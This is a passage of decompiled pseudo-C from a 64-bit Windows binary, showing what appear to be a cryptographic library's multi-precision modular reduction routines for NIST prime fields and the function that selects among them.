  return &off_14010EC78;
}
// 14010EC78: using guessed type void *off_14010EC78;

//----- (00000001400767F0) ----------------------------------------------------
void **sub_1400767F0()
{
  return &off_14010ED18;
}
// 14010ED18: using guessed type void *off_14010ED18;

//----- (0000000140076800) ----------------------------------------------------
void **sub_140076800()
{
  return &off_14010ED30;
}
// 14010ED30: using guessed type void *off_14010ED30;

//----- (0000000140076810) ----------------------------------------------------
void **sub_140076810()
{
  return &off_14010ED48;
}
// 14010ED48: using guessed type void *off_14010ED48;

//----- (0000000140076820) ----------------------------------------------------
__int64 __fastcall sub_140076820(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  int v4; // ebp
  _QWORD *v6; // r14
  int v9; // eax
  __int64 result; // rax
  unsigned __int64 v11; // rbx
  int v12; // edi
  __int64 v13; // r10
  __int64 v14; // r11
  __int64 v15; // rcx
  signed __int64 v16; // rax
  __int64 v17; // r8
  __int64 v18; // rdi
  unsigned __int64 v19; // r9
  __int64 v20; // rdx
  __int64 v21; // rcx
  unsigned __int64 v22; // rax
  __int64 v23; // rcx
  __int64 v24; // rdi
  __int64 v25; // r8
  __int64 v26; // rdx
  unsigned __int64 v27; // rax
  __int64 v28; // rdx
  __int64 v29; // rcx
  __int64 v30; // rdx
  __int64 v31; // rdx
  int v32; // ebp
  __int64 v33; // rax
  int v34[4]; // [rsp+20h] [rbp-68h] BYREF
  unsigned int v35; // [rsp+30h] [rbp-58h]
  unsigned int v36; // [rsp+34h] [rbp-54h]
  char v37[24]; // [rsp+40h] [rbp-48h] BYREF

  v4 = *(_DWORD *)(a2 + 8);
  v6 = *(_QWORD **)a2;
  if ( sub_1400270E0(a2) || (int)sub_140027600((__int64 *)a2, (__int64 *)&off_14010ED60) >= 0 )
    return sub_1400798F0(a1, a2, (__int64)&off_14010E9A8, a4);
  v9 = sub_140027600((__int64 *)&off_14010E9A8, (__int64 *)a2);
  if ( !v9 )
  {
    sub_140027560(a1, 0i64);
    return 1i64;
  }
  if ( v9 <= 0 )
  {
    if ( a1 == a2 )
    {
      v11 = (unsigned __int64)v6;
    }
    else
    {
      result = (__int64)sub_140027B30(a1, 3);
      if ( !result )
        return result;
      v11 = *(_QWORD *)a1;
      *(_QWORD *)v11 = *v6;
      *(_QWORD *)(v11 + 8) = v6[1];
      *(_QWORD *)(v11 + 16) = v6[2];
    }
    v12 = 0;
    if ( v4 - 3 <= 0 || (v12 = v4 - 3, memmove(v34, v6 + 3, 8i64 * (v4 - 3)), v4 - 3 < 3) )
      memset(&v34[2 * v12], 0, 8i64 * (3 - v12));
    v13 = (unsigned int)v34[0];
    v14 = (unsigned int)v34[1];
    v15 = *(unsigned int *)(v11 + 4);
    v16 = v35 + (unsigned int)v34[0] + (unsigned __int64)*(unsigned int *)v11;
    v17 = v36;
    v18 = *(unsigned int *)(v11 + 8);
    v19 = v35 + (unsigned __int64)(unsigned int)v34[2];
    *(_DWORD *)v11 = v16;
    v20 = *(unsigned int *)(v11 + 12);
    v21 = v17 + v14 + (v16 >> 32) + v15;
    *(_DWORD *)(v11 + 4) = v21;
    v22 = v19 + (v21 >> 32);
    v23 = *(unsigned int *)(v11 + 16);
    v24 = v13 + v22 + v18;
    v25 = (unsigned int)v34[3] + v17;
    *(_DWORD *)(v11 + 8) = v24;
    v26 = v14 + v25 + (v24 >> 32) + v20;
    *(_DWORD *)(v11 + 12) = v26;
    v27 = v19 + (v26 >> 32);
    v28 = *(unsigned int *)(v11 + 20);
    v29 = v27 + v23;
    *(_DWORD *)(v11 + 16) = v29;
    v30 = v25 + (v29 >> 32) + v28;
    *(_DWORD *)(v11 + 20) = v30;
    v31 = v30 >> 32;
    if ( (int)v31 <= 0 )
      v32 = 1;
    else
      v32 = sub_140075060((char *)v11, (char *)v11, &byte_14010E930[24 * (int)v31 - 24], 3);
    v33 = sub_140075060(v37, (char *)v11, byte_14010E930, 3);
    *(_QWORD *)v11 = *(_QWORD *)(v11 & -(__int64)v32 & -v33 | (unsigned __int64)v37 & ~(-(__int64)v32 & -v33));
    *(_QWORD *)(v11 + 8) = *(_QWORD *)((v11 & -(__int64)v32 & -v33 | (unsigned __int64)v37 & ~(-(__int64)v32 & -v33)) + 8);
    *(_QWORD *)(v11 + 16) = *(_QWORD *)((v11 & -(__int64)v32 & -v33 | (unsigned __int64)v37 & ~(-(__int64)v32 & -v33))
                                      + 0x10);
    *(_DWORD *)(a1 + 8) = 3;
    sub_1400278D0(a1);
    return 1i64;
  }
  else
  {
    return a1 == a2 || sub_140026E90(a1, a2) != 0i64;
  }
}
// 14010E9A8: using guessed type void *off_14010E9A8;
// 14010ED60: using guessed type void *off_14010ED60;

//----- (0000000140076AA0) ----------------------------------------------------
__int64 __fastcall sub_140076AA0(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  int v4; // r14d
  char *v6; // rbx
  int v9; // eax
  __int64 result; // rax
  char *v11; // r15
  __int64 v12; // rdi
  int v13; // r8d
  __int64 v14; // rax
  __int64 v15; // rbx
  unsigned __int64 v16; // r14
  __int64 v17; // rdi
  __int64 v18; // rsi
  unsigned __int64 v19; // rbx
  __int64 v20; // rax
  int v21; // ebx
  __int64 v22; // rax
  unsigned __int64 v23; // [rsp+20h] [rbp-58h] BYREF
  unsigned __int128 v24; // [rsp+28h] [rbp-50h]
  unsigned __int64 v25; // [rsp+38h] [rbp-40h]
  __m256 v26; // [rsp+40h] [rbp-38h] BYREF

  v4 = *(_DWORD *)(a2 + 8);
  v6 = *(char **)a2;
  if ( sub_1400270E0(a2) || (int)sub_140027600((__int64 *)a2, (__int64 *)&off_14010ED78) >= 0 )
    return sub_1400798F0(a1, a2, (__int64)&off_14010EC78, a4);
  v9 = sub_140027600((__int64 *)&off_14010EC78, (__int64 *)a2);
  if ( !v9 )
  {
    sub_140027560(a1, 0i64);
    return 1i64;
  }
  if ( v9 <= 0 )
  {
    if ( a1 == a2 )
    {
      v11 = v6;
    }
    else
    {
      result = (__int64)sub_140027B30(a1, 4);
      if ( !result )
        return result;
      v11 = *(char **)a1;
      *(_QWORD *)v11 = *(_QWORD *)v6;
      *((_QWORD *)v11 + 1) = *((_QWORD *)v6 + 1);
      *((_QWORD *)v11 + 2) = *((_QWORD *)v6 + 2);
      *((_QWORD *)v11 + 3) = *((_QWORD *)v6 + 3);
    }
    v12 = v4 - 3;
    v13 = 0;
    v14 = 0i64;
    if ( v12 <= 0 )
      goto LABEL_17;
    v13 = v4 - 3;
    v15 = v6 - (char *)&v26 + 24;
    do
    {
      *(_QWORD *)&v26.m256_f32[2 * v14] = *(_QWORD *)((char *)&v26.m256_f32[2 * v14] + v15);
      ++v14;
    }
    while ( v14 < v12 );
    if ( (int)v12 < 4 )
LABEL_17:
      memset((char *)&v26 + 8 * v13, 0, 8i64 * (4 - v13));
    LODWORD(v23) = 0;
    v16 = *(_QWORD *)&v26.m256_f32[1];
    v17 = LODWORD(v26.m256_f32[7]);
    v18 = *(_QWORD *)&v26.m256_f32[5];
    v19 = *(_QWORD *)&v26.m256_f32[3];
    *((_DWORD *)v11 + 7) = 0;
    HIDWORD(v23) = 0;
    *(_QWORD *)&v24 = v16 << 32;
    *((_QWORD *)&v24 + 1) = (v19 << 32) | HIDWORD(v16);
    v25 = HIDWORD(v19);
    sub_140070880(v11, v11, (char *)&v23, 4);
    v23 = 0i64;
    v24 = __PAIR128__(v17, v18) * 0x100000000i64;
    v25 = 0i64;
    sub_140070880(v11, v11, (char *)&v23, 4);
    v23 = v16;
    *(_QWORD *)&v24 = v19;
    *((_QWORD *)&v24 + 1) = v18;
    v25 = v17;
    sub_140075060(v11, v11, (char *)&v23, 4);
    LODWORD(v24) = v17;
    v23 = v18;
    *(_QWORD *)((char *)&v24 + 4) = 0i64;
    HIDWORD(v24) = 0;
    v25 = 0i64;
    sub_140075060(v11, v11, (char *)&v23, 4);
    v20 = HIDWORD(*((_QWORD *)v11 + 3));
    if ( (int)v20 <= 0 )
    {
      if ( (int)v20 < 0 )
      {
        v21 = sub_140070880(v11, v11, &byte_14010E9C0[32 * ~(_DWORD)v20], 4);
        v22 = ((__int64 (__fastcall *)(char *, char *, char *, int))((unsigned __int64)sub_140075060 & -(__int64)v21 | (unsigned __int64)sub_140070880 & (v21 - 1i64)))(
                (char *)&v26,
                v11,
                byte_14010E9C0,
                4);
LABEL_24:
        *(_QWORD *)v11 = *(_QWORD *)((unsigned __int64)v11 & -(__int64)v21 & -v22 | (unsigned __int64)&v26 & ~(-(__int64)v21 & -v22));
        *((_QWORD *)v11 + 1) = *(_QWORD *)(((unsigned __int64)v11 & -(__int64)v21 & -v22 | (unsigned __int64)&v26 & ~(-(__int64)v21 & -v22))
                                         + 8);
        *((_QWORD *)v11 + 2) = *(_QWORD *)(((unsigned __int64)v11 & -(__int64)v21 & -v22 | (unsigned __int64)&v26 & ~(-(__int64)v21 & -v22))
                                         + 0x10);
        *((_QWORD *)v11 + 3) = *(_QWORD *)(((unsigned __int64)v11 & -(__int64)v21 & -v22 | (unsigned __int64)&v26 & ~(-(__int64)v21 & -v22))
                                         + 0x18);
        *(_DWORD *)(a1 + 8) = 4;
        sub_1400278D0(a1);
        return 1i64;
      }
      v21 = 1;
    }
    else
    {
      sub_140075060(v11, v11, &byte_14010E9C0[32 * (int)v20 - 32], 4);
      v21 = (*((_QWORD *)v11 + 3) & 0x100000000i64) == 0;
    }
    v22 = sub_140075060((char *)&v26, v11, byte_14010E9C0, 4);
    goto LABEL_24;
  }
  return a1 == a2 || sub_140026E90(a1, a2) != 0i64;
}
// 14010EC78: using guessed type void *off_14010EC78;
// 14010ED78: using guessed type void *off_14010ED78;

//----- (0000000140076E50) ----------------------------------------------------
__int64 __fastcall sub_140076E50(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  int v4; // r14d
  _QWORD *v6; // rsi
  int v9; // eax
  __int64 result; // rax
  unsigned __int64 v11; // r15
  int v12; // ebx
  __int64 v13; // r14
  __int64 v14; // r9
  __int64 v15; // rdi
  __int64 v16; // r11
  __int64 v17; // rbx
  __int64 v18; // r10
  __int64 v19; // r8
  __int64 v20; // rsi
  __int64 v21; // rdx
  __int64 v22; // rcx
  signed __int64 v23; // rax
  __int64 v24; // rdx
  __int64 v25; // rax
  __int64 v26; // rdx
  __int64 v27; // rcx
  __int64 v28; // rdx
  __int64 v29; // rcx
  __int64 v30; // rdx
  __int64 v31; // rcx
  __int64 v32; // rdx
  __int64 v33; // rdx
  __int64 v34; // rcx
  __int64 v35; // rcx
  int v36; // esi
  __int64 v37; // rax
  unsigned int v38; // [rsp+20h] [rbp-78h] BYREF
  unsigned int v39; // [rsp+24h] [rbp-74h]
  unsigned int v40; // [rsp+28h] [rbp-70h]
  unsigned int v41; // [rsp+2Ch] [rbp-6Ch]
  unsigned int v42; // [rsp+30h] [rbp-68h]
  unsigned int v43; // [rsp+34h] [rbp-64h]
  unsigned int v44; // [rsp+38h] [rbp-60h]
  unsigned int v45; // [rsp+3Ch] [rbp-5Ch]
  char v46[32]; // [rsp+48h] [rbp-50h] BYREF

  v4 = *(_DWORD *)(a2 + 8);
  v6 = *(_QWORD **)a2;
  if ( sub_1400270E0(a2) || (int)sub_140027600((__int64 *)a2, (__int64 *)&off_14010E8B0) >= 0 )
    return sub_1400798F0(a1, a2, (__int64)&off_14010ED18, a4);
  v9 = sub_140027600((__int64 *)&off_14010ED18, (__int64 *)a2);
  if ( !v9 )
  {
    sub_140027560(a1, 0i64);
    return 1i64;
  }
  if ( v9 <= 0 )
  {
    if ( a1 == a2 )
    {
      v11 = (unsigned __int64)v6;
    }
    else
    {
      result = (__int64)sub_140027B30(a1, 4);
      if ( !result )
        return result;
      v11 = *(_QWORD *)a1;
      *(_QWORD *)v11 = *v6;
      *(_QWORD *)(v11 + 8) = v6[1];
      *(_QWORD *)(v11 + 16) = v6[2];
      *(_QWORD *)(v11 + 24) = v6[3];
    }
    v12 = 0;
    if ( v4 - 4 <= 0 || (v12 = v4 - 4, memmove(&v38, v6 + 4, 8i64 * (v4 - 4)), v4 - 4 < 4) )
      memset(&v38 + 2 * v12, 0, 8i64 * (4 - v12));
    v13 = v43;
    v14 = v44;
    v15 = v45;
    v16 = v41;
    v17 = v42;
    v18 = v39;
    v19 = v40;
    v20 = v38;
    v21 = *(unsigned int *)(v11 + 4);
    v22 = *(unsigned int *)(v11 + 8);
    v23 = v39 + v38 + *(unsigned int *)v11 - (unsigned __int64)v41 - v42 - v43 - v44;
    *(_DWORD *)v11 = v23;
    v24 = v18 + v19 + (v23 >> 32) - v15 - v17 - v13 - v14 + v21;
    *(_DWORD *)(v11 + 4) = v24;
    v25 = v19 + (v24 >> 32) - v15 - v13 - v14;
    v26 = *(unsigned int *)(v11 + 12);
    v27 = v16 + v25 + v22;
    *(_DWORD *)(v11 + 8) = v27;
    v28 = v13 + (v27 >> 32) + 2 * (v16 + v17) - v15 - v20 - v18 + v26;
    *(_DWORD *)(v11 + 12) = v28;
    v29 = v14 + *(unsigned int *)(v11 + 16) + (v28 >> 32) + 2 * (v17 + v13) - v19 - v18;
    *(_DWORD *)(v11 + 16) = v29;
    v30 = (v29 >> 32) + 2 * (v13 + v14);
    v31 = *(unsigned int *)(v11 + 28);
    v32 = v15 + *(unsigned int *)(v11 + 20) + v30 - v19 - v16;
    *(_DWORD *)(v11 + 20) = v32;
    v33 = v13 + (v32 >> 32) + 3 * v14 + 2 * v15 - v20 - v18 + *(unsigned int *)(v11 + 24);
    *(_DWORD *)(v11 + 24) = v33;
    v34 = v20 + (v33 >> 32) + 3 * v15 - v19 - v16 - v17 - v13 + v31;
    *(_DWORD *)(v11 + 28) = v34;
    v35 = v34 >> 32;
    if ( (int)v35 <= 0 )
    {
      if ( (int)v35 < 0 )
      {
        v36 = sub_140070880((char *)v11, (char *)v11, &byte_14010EA00[32 * ~(_DWORD)v35], 4);
        v37 = ((__int64 (__fastcall *)(char *, char *, char *, int))((unsigned __int64)sub_140075060 & -(__int64)v36 | (unsigned __int64)sub_140070880 & (v36 - 1i64)))(
                v46,
                (char *)v11,
                byte_14010EA00,
                4);
LABEL_22:
        *(_QWORD *)v11 = *(_QWORD *)(v11 & -(__int64)v36 & -v37 | (unsigned __int64)v46 & ~(-(__int64)v36 & -v37));
        *(_QWORD *)(v11 + 8) = *(_QWORD *)((v11 & -(__int64)v36 & -v37 | (unsigned __int64)v46 & ~(-(__int64)v36 & -v37))
                                         + 8);
        *(_QWORD *)(v11 + 16) = *(_QWORD *)((v11 & -(__int64)v36 & -v37 | (unsigned __int64)v46 & ~(-(__int64)v36 & -v37))
                                          + 0x10);
        *(_QWORD *)(v11 + 24) = *(_QWORD *)((v11 & -(__int64)v36 & -v37 | (unsigned __int64)v46 & ~(-(__int64)v36 & -v37))
                                          + 0x18);
        *(_DWORD *)(a1 + 8) = 4;
        sub_1400278D0(a1);
        return 1i64;
      }
      v36 = 1;
    }
    else
    {
      v36 = sub_140075060((char *)v11, (char *)v11, &byte_14010EA00[32 * (int)v35 - 32], 4);
    }
    v37 = sub_140075060(v46, (char *)v11, byte_14010EA00, 4);
    goto LABEL_22;
  }
  return a1 == a2 || sub_140026E90(a1, a2) != 0i64;
}
// 14010E8B0: using guessed type void *off_14010E8B0;
// 14010ED18: using guessed type void *off_14010ED18;

//----- (00000001400771D0) ----------------------------------------------------
__int64 __fastcall sub_1400771D0(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  int v4; // r14d
  _QWORD *v6; // rsi
  int v9; // eax
  __int64 result; // rax
  unsigned __int64 v11; // r13
  int v12; // ebx
  __int64 v13; // r8
  __int64 v14; // rbp
  __int64 v15; // r15
  __int64 v16; // r12
  __int64 v17; // r10
  __int64 v18; // r9
  __int64 v19; // r14
  __int64 v20; // rcx
  __int64 v21; // rsi
  __int64 v22; // rdx
  unsigned __int64 v23; // rdi
  __int64 v24; // rbx
  __int64 v25; // rax
  __int64 v26; // r11
  __int64 v27; // rcx
  __int64 v28; // rax
  __int64 v29; // rcx
  __int64 v30; // rdx
  __int64 v31; // rax
  __int64 v32; // rcx
  __int64 v33; // rdx
  __int64 v34; // rdi
  __int64 v35; // rdx
  __int64 v36; // rax
  __int64 v37; // rdx
  __int64 v38; // r8
  __int64 v39; // rdx
  __int64 v40; // rcx
  __int64 v41; // rdx
  __int64 v42; // rcx
  __int64 v43; // rax
  __int64 v44; // rdx
  __int64 v45; // rdx
  __int64 v46; // rax
  __int64 v47; // rcx
  __int64 v48; // rdx
  __int64 v49; // rdx
  __int64 v50; // rax
  __int64 v51; // rdx
  __int64 v52; // rcx
  __int64 v53; // rax
  __int64 v54; // rcx
  __int64 v55; // rdx
  __int64 v56; // rcx
  __int64 v57; // rcx
  int v58; // esi
  __int64 v59; // rax
  int v61[8]; // [rsp+28h] [rbp-B0h] BYREF
  unsigned int v62; // [rsp+48h] [rbp-90h]
  unsigned int v63; // [rsp+4Ch] [rbp-8Ch]
  unsigned int v64; // [rsp+50h] [rbp-88h]
  unsigned int v65; // [rsp+54h] [rbp-84h]
  char v66[48]; // [rsp+60h] [rbp-78h] BYREF

  v4 = *(_DWORD *)(a2 + 8);
  v6 = *(_QWORD **)a2;
  if ( sub_1400270E0(a2) || (int)sub_140027600((__int64 *)a2, (__int64 *)&off_14010E8C8) >= 0 )
    return sub_1400798F0(a1, a2, (__int64)&off_14010ED30, a4);
  v9 = sub_140027600((__int64 *)&off_14010ED30, (__int64 *)a2);
  if ( !v9 )
  {
    sub_140027560(a1, 0i64);
    return 1i64;
  }
  if ( v9 <= 0 )
  {
    if ( a1 == a2 )
    {
      v11 = (unsigned __int64)v6;
    }
    else
    {
      result = (__int64)sub_140027B30(a1, 6);
      if ( !result )
        return result;
      v11 = *(_QWORD *)a1;
      *(_QWORD *)v11 = *v6;
      *(_QWORD *)(v11 + 8) = v6[1];
      *(_QWORD *)(v11 + 16) = v6[2];
      *(_QWORD *)(v11 + 24) = v6[3];
      *(_QWORD *)(v11 + 32) = v6[4];
      *(_QWORD *)(v11 + 40) = v6[5];
    }
    v12 = 0;
    if ( v4 - 6 <= 0 || (v12 = v4 - 6, memmove(v61, v6 + 6, 8i64 * (v4 - 6)), v4 - 6 < 6) )
      memset(&v61[2 * v12], 0, 8i64 * (6 - v12));
    v13 = (unsigned int)v61[0];
    v14 = v65;
    v15 = v64;
    v16 = v62;
    v17 = (unsigned int)v61[1];
    v18 = (unsigned int)v61[2];
    v19 = v63;
    v20 = *(unsigned int *)(v11 + 4);
    v21 = (unsigned int)v61[3];
    v22 = *(unsigned int *)(v11 + 8);
    v23 = v63 - (unsigned __int64)v65;
    v24 = (unsigned int)v61[4];
    v25 = v23 + v62 + (unsigned int)v61[0] + (unsigned __int64)*(unsigned int *)v11;
    v26 = (unsigned int)v61[5];
    *(_DWORD *)v11 = v25;
    v27 = v14 + v15 + v17 + (v25 >> 32) - v13 - v16 + v20;
    *(_DWORD *)(v11 + 4) = v27;
    v28 = v18 + (v27 >> 32) - v17 - v19;
    v29 = *(unsigned int *)(v11 + 12);
    v30 = v14 + v28 + v22;
    *(_DWORD *)(v11 + 8) = v30;
    v31 = *(unsigned int *)(v11 + 16);
    v32 = v21 + v23 + v16 + v13 + (v30 >> 32) - v18 - v15 + v29;
    *(_DWORD *)(v11 + 12) = v32;
    v33 = (v32 >> 32) + 2 * v23;
    v34 = (unsigned int)v61[7];
    v35 = v31 + v33;
    v36 = *(unsigned int *)(v11 + 20);
    v37 = v13 + v15 + v17 + v35 - v21;
    v38 = (unsigned int)v61[6];
    v39 = v24 + v16 + v37;
    *(_DWORD *)(v11 + 16) = v39;
    v40 = (v39 >> 32) + 2 * v15;
    v41 = *(unsigned int *)(v11 + 24);
    v42 = v26 + v14 + v19 + v17 + v18 + v36 + v40 - v24;
    *(_DWORD *)(v11 + 20) = v42;
    v43 = *(unsigned int *)(v11 + 28);
    v44 = v21 + v38 + v15 + v18 + (v42 >> 32) + 2 * v14 - v26 + v41;
    *(_DWORD *)(v11 + 24) = v44;
    v45 = v43 + (v44 >> 32);
    v46 = *(unsigned int *)(v11 + 32);
    v47 = *(unsigned int *)(v11 + 36);
    v48 = v21 + v24 + v34 + v14 + v45 - v38;
    *(_DWORD *)(v11 + 28) = v48;
    v49 = v24 + v26 + v16 + v46 + (v48 >> 32) - v34;
    *(_DWORD *)(v11 + 32) = v49;
    v50 = v19 + (v49 >> 32) - v16;
    v51 = *(unsigned int *)(v11 + 40);
    v52 = v26 + v38 + v50 + v47;
    *(_DWORD *)(v11 + 36) = v52;
    v53 = v15 + (v52 >> 32) - v19;
    v54 = *(unsigned int *)(v11 + 44);
    v55 = v38 + v34 + v53 + v51;
    *(_DWORD *)(v11 + 40) = v55;
    v56 = v34 + v14 + v16 + (v55 >> 32) - v15 + v54;
    *(_DWORD *)(v11 + 44) = v56;
    v57 = v56 >> 32;
    if ( (int)v57 <= 0 )
    {
      if ( (int)v57 < 0 )
      {
        v58 = sub_140070880((char *)v11, (char *)v11, &byte_14010EAE0[48 * ~(_DWORD)v57], 6);
        v59 = ((__int64 (__fastcall *)(char *, char *, char *, int))((unsigned __int64)sub_140075060 & -(__int64)v58 | (unsigned __int64)sub_140070880 & (v58 - 1i64)))(
                v66,
                (char *)v11,
                byte_14010EAE0,
                6);
LABEL_22:
        *(_QWORD *)v11 = *(_QWORD *)(v11 & -(__int64)v58 & -v59 | (unsigned __int64)v66 & ~(-(__int64)v58 & -v59));
        *(_QWORD *)(v11 + 8) = *(_QWORD *)((v11 & -(__int64)v58 & -v59 | (unsigned __int64)v66 & ~(-(__int64)v58 & -v59))
                                         + 8);
        *(_QWORD *)(v11 + 16) = *(_QWORD *)((v11 & -(__int64)v58 & -v59 | (unsigned __int64)v66 & ~(-(__int64)v58 & -v59))
                                          + 0x10);
        *(_QWORD *)(v11 + 24) = *(_QWORD *)((v11 & -(__int64)v58 & -v59 | (unsigned __int64)v66 & ~(-(__int64)v58 & -v59))
                                          + 0x18);
        *(_QWORD *)(v11 + 32) = *(_QWORD *)((v11 & -(__int64)v58 & -v59 | (unsigned __int64)v66 & ~(-(__int64)v58 & -v59))
                                          + 0x20);
        *(_QWORD *)(v11 + 40) = *(_QWORD *)((v11 & -(__int64)v58 & -v59 | (unsigned __int64)v66 & ~(-(__int64)v58 & -v59))
                                          + 0x28);
        *(_DWORD *)(a1 + 8) = 6;
        sub_1400278D0(a1);
        return 1i64;
      }
      v58 = 1;
    }
    else
    {
      v58 = sub_140075060((char *)v11, (char *)v11, &byte_14010EAE0[48 * (int)v57 - 48], 6);
    }
    v59 = sub_140075060(v66, (char *)v11, byte_14010EAE0, 6);
    goto LABEL_22;
  }
  return a1 == a2 || sub_140026E90(a1, a2) != 0i64;
}
// 14010E8C8: using guessed type void *off_14010E8C8;
// 14010ED30: using guessed type void *off_14010ED30;

//----- (0000000140077620) ----------------------------------------------------
__int64 __fastcall sub_140077620(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  int v4; // r15d
  char *v6; // rdi
  int v9; // eax
  __int64 result; // rax
  char *v11; // rbx
  int v12; // r8d
  __int64 v13; // r9
  __int64 v14; // rax
  __int64 v15; // rdi
  __int64 v16; // rax
  _OWORD v17[5]; // [rsp+20h] [rbp-60h] BYREF

  v4 = *(_DWORD *)(a2 + 8);
  v6 = *(char **)a2;
  if ( sub_1400270E0(a2) || (int)sub_140027600((__int64 *)a2, (__int64 *)&off_14010E8E0) >= 0 )
    return sub_1400798F0(a1, a2, (__int64)&off_14010ED48, a4);
  v9 = sub_140027600((__int64 *)&off_14010ED48, (__int64 *)a2);
  if ( !v9 )
  {
    sub_140027560(a1, 0i64);
    return 1i64;
  }
  if ( v9 <= 0 )
  {
    if ( a1 == a2 )
    {
      v11 = v6;
    }
    else
    {
      result = (__int64)sub_140027B30(a1, 9);
      if ( !result )
        return result;
      v11 = *(char **)a1;
      *(_QWORD *)v11 = *(_QWORD *)v6;
      *((_QWORD *)v11 + 1) = *((_QWORD *)v6 + 1);
      *((_QWORD *)v11 + 2) = *((_QWORD *)v6 + 2);
      *((_QWORD *)v11 + 3) = *((_QWORD *)v6 + 3);
      *((_QWORD *)v11 + 4) = *((_QWORD *)v6 + 4);
      *((_QWORD *)v11 + 5) = *((_QWORD *)v6 + 5);
      *((_QWORD *)v11 + 6) = *((_QWORD *)v6 + 6);
      *((_QWORD *)v11 + 7) = *((_QWORD *)v6 + 7);
      *((_QWORD *)v11 + 8) = *((_QWORD *)v6 + 8);
    }
    v12 = 0;
    v13 = v4 - 8;
    v14 = 0i64;
    if ( v13 <= 0 )
      goto LABEL_17;
    v12 = v4 - 8;
    v15 = v6 - (char *)v17 + 64;
    do
    {
      *((_QWORD *)v17 + v14) = *(_QWORD *)((char *)v17 + 8 * v14 + v15);
      ++v14;
    }
    while ( v14 < v13 );
    if ( (int)v13 < 9 )
LABEL_17:
      memset((char *)v17 + 8 * v12, 0, 8i64 * (9 - v12));
    *(_QWORD *)&v17[0] = v17[0] >> 9;
    *((_QWORD *)&v17[0] + 1) = *(_OWORD *)((char *)v17 + 8) >> 9;
    *(_QWORD *)&v17[1] = v17[1] >> 9;
    *((_QWORD *)&v17[1] + 1) = *(_OWORD *)((char *)&v17[1] + 8) >> 9;
    *(_QWORD *)&v17[2] = v17[2] >> 9;
    *((_QWORD *)&v17[2] + 1) = *(_OWORD *)((char *)&v17[2] + 8) >> 9;
    *(_QWORD *)&v17[3] = v17[3] >> 9;
    *(_OWORD *)((char *)&v17[3] + 8) >>= 9;
    *((_QWORD *)v11 + 8) &= 0x1FFui64;
    sub_140070880(v11, v11, (char *)v17, 9);
    v16 = sub_140075060((char *)v17, v11, byte_14010EC30, 9);
    *(_QWORD *)v11 = *(_QWORD *)((unsigned __int64)v11 & -v16 | (unsigned __int64)v17 & (v16 - 1));
    *((_QWORD *)v11 + 1) = *(_QWORD *)(((unsigned __int64)v11 & -v16 | (unsigned __int64)v17 & (v16 - 1)) + 8);
    *((_QWORD *)v11 + 2) = *(_QWORD *)(((unsigned __int64)v11 & -v16 | (unsigned __int64)v17 & (v16 - 1)) + 0x10);
    *((_QWORD *)v11 + 3) = *(_QWORD *)(((unsigned __int64)v11 & -v16 | (unsigned __int64)v17 & (v16 - 1)) + 0x18);
    *((_QWORD *)v11 + 4) = *(_QWORD *)(((unsigned __int64)v11 & -v16 | (unsigned __int64)v17 & (v16 - 1)) + 0x20);
    *((_QWORD *)v11 + 5) = *(_QWORD *)(((unsigned __int64)v11 & -v16 | (unsigned __int64)v17 & (v16 - 1)) + 0x28);
    *((_QWORD *)v11 + 6) = *(_QWORD *)(((unsigned __int64)v11 & -v16 | (unsigned __int64)v17 & (v16 - 1)) + 0x30);
    *((_QWORD *)v11 + 7) = *(_QWORD *)(((unsigned __int64)v11 & -v16 | (unsigned __int64)v17 & (v16 - 1)) + 0x38);
    *((_QWORD *)v11 + 8) = *(_QWORD *)(((unsigned __int64)v11 & -v16 | (unsigned __int64)v17 & (v16 - 1)) + 0x40);
    *(_DWORD *)(a1 + 8) = 9;
    sub_1400278D0(a1);
    return 1i64;
  }
  else
  {
    return a1 == a2 || sub_140026E90(a1, a2) != 0i64;
  }
}
// 14010E8E0: using guessed type void *off_14010E8E0;
// 14010ED48: using guessed type void *off_14010ED48;

//----- (0000000140077950) ----------------------------------------------------
__int64 (__fastcall *__fastcall sub_140077950(__int64 *a1))(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  int v3; // eax
  __int64 v4; // rcx

  if ( !(unsigned int)sub_140027600((__int64 *)&off_14010E9A8, a1) )
    return sub_140076820;
  if ( !(unsigned int)sub_140027600((__int64 *)&off_14010EC78, a1) )
    return sub_140076AA0;
  if ( !(unsigned int)sub_140027600((__int64 *)&off_14010ED18, a1) )
    return sub_140076E50;
  if ( !(unsigned int)sub_140027600((__int64 *)&off_14010ED30, a1) )
    return sub_1400771D0;
  v3 = sub_140027600((__int64 *)&off_14010ED48, a1);
  v4 = 0i64;
  if ( !v3 )
    return sub_140077620;
  return (__int64 (__fastcall *)(__int64, __int64, __int64, int *))v4;
}
// 14010E9A8: using guessed type void *off_14010E9A8;
// 14010EC78: using guessed type void *off_14010EC78;
// 14010ED18: using guessed type void *off_14010ED18;
// 14010ED30: using guessed type void *off_14010ED30;
// 14010ED48: using guessed type void *off_14010ED48;

//----- (0000000140077A10) ----------------------------------------------------
__int64 __fastcall sub_140077A10(__int64 a1)
{
  __int64 result; // rax

  result = sub_1400AEFB0(a1);
  *(_QWORD *)(a1 + 120) = 0i64;
  *(_QWORD *)(a1 + 128) = 0i64;
  return result;
}

//----- (0000000140077A40) ----------------------------------------------------
int *__fastcall sub_140077A40(__int64 a1, __int64 **a2, __int64 a3, __int64 a4, int *a5)
{
  __int64 v6; // rbp
  _DWORD *v7; // rsi
  unsigned int v8; // r15d
  _DWORD *v11; // rcx
  int *v12; // r14
  int *result; // rax
  _DWORD *v14; // rax
  __int64 v15; // rdi
  void **v16; // rax
  _DWORD *v17; // rcx

  v6 = 0i64;
  v7 = 0i64;
  v8 = 0;
  sub_14003C3A0(*(_QWORD *)(a1 + 120));
  v11 = *(_DWORD **)(a1 + 128);
  *(_QWORD *)(a1 + 120) = 0i64;
  sub_140026FF0(v11);
  v12 = a5;
  *(_QWORD *)(a1 + 128) = 0i64;
  if ( a5 || (result = (int *)sub_140027CD0(), v6 = (__int64)result, (v12 = result) != 0i64) )
  {
    v14 = sub_14003C400();
    v15 = (__int64)v14;
    if ( v14 )
    {
      if ( (unsigned int)sub_14003C480((__int64)v14, a2, v12) )
      {
        v7 = sub_140027200();
        if ( v7 )
        {
          v16 = sub_140027650();
          if ( (unsigned int)sub_1400275D0((__int64)v7, (__int64)v16, v15, v12) )
          {
            *(_QWORD *)(a1 + 120) = v15;
